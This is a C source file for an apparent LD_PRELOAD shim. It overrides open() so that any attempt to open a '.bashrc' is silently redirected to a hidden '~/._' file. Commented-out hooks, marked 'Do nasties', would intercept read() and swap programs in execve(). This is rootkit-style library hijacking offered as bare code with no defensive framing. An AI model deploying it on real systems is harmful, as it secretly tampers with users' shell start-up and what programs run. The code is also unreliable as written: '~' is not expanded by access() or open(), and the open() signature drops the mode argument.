#include <stdio.h>
#include <string.h>
#include <dlfcn.h> // Read
#include <stdlib.h>
#include <unistd.h>

/* static int (*real_read)(int fd, void *buf, size_t count);
static int (*real_execve)(const char *filename, char *const argv[], char *const envp[]); */
static int (*real_open)(const char *filename, int flags);


/* int read (int file, void *buffer, size_t count) {
	char* message;

	real_read = dlsym(RTLD_NEXT, "read");

	if((message = dlerror()) != NULL) {
		printf(" *** read dlopen failed: %s\n", message);
	}

//	fprintf(stderr, "read(%d,...,%d)\n",file,count);
	// Do nasties
	
	return real_read(file, buffer, count);
} */

/* int execve(char *filename, char *const argv[], char *const envp[]) {
	char* message;

	real_execve = dlsym(RTLD_NEXT, "execve");

	if((message = dlerror()) != NULL) {
		printf(" *** execve dlopen failed: %s\n", message);
	}

	// Do more nasties
	if (strcmp("/bin/ls", filename) == 0) {
		filename = "/bin/du";
	}

	
	return real_execve(filename, argv, envp);
} */

int open(char *filename, int flags) {
	char* message;

	real_open = dlsym(RTLD_NEXT, "open");

	if ((message = dlerror()) != NULL) {
		printf(" *** open dlopen failed: %s\n", message);
	}

	// Do nasty and hackish calulation of length of string
        int len = 0;
        while (filename[++len] != '\x0' && len < 1000);

	if (len > 6 && strcmp(&filename[len-7], ".bashrc") == 0 && access("~/._", R_OK) == 0)
			filename = "~/._";

	return real_open(filename, flags);
}

